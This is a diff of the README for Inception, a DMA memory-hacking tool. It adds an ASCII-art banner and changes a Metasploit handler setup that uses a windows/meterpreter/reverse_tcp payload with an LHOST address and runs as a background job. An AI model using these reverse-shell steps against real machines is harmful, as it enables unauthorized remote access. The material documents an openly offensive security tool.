@@ -1,5 +1,8 @@
-Inception
-=========
+ _|  _|      _|    _|_|_|  _|_|_|_|  _|_|_|    _|_|_|  _|    _|_|    _|      _|
+ _|  _|_|    _|  _|        _|        _|    _|    _|    _|  _|    _|  _|_|    _|
+ _|  _|  _|  _|  _|        _|_|_|    _|_|_|      _|    _|  _|    _|  _|  _|  _|
+ _|  _|    _|_|  _|        _|        _|          _|    _|  _|    _|  _|    _|_|
+ _|  _|      _|    _|_|_|  _|_|_|_|  _|          _|    _|    _|_|    _|      _|
 
 Inception is a physical memory manipulation and hacking tool exploiting PCI-
 based DMA. The tool can attack over FireWire, Thunderbolt, ExpressCard, PC
@@ -232,7 +235,8 @@ if something should go awry:
     set payload windows/meterpreter/reverse_tcp
     set LHOST 172.16.1.1
     set EXITFUNC thread
-    exploit
+    set ExitOnSession false
+    exploit -j
 
 Then, in another terminal, we launch Inception:
 
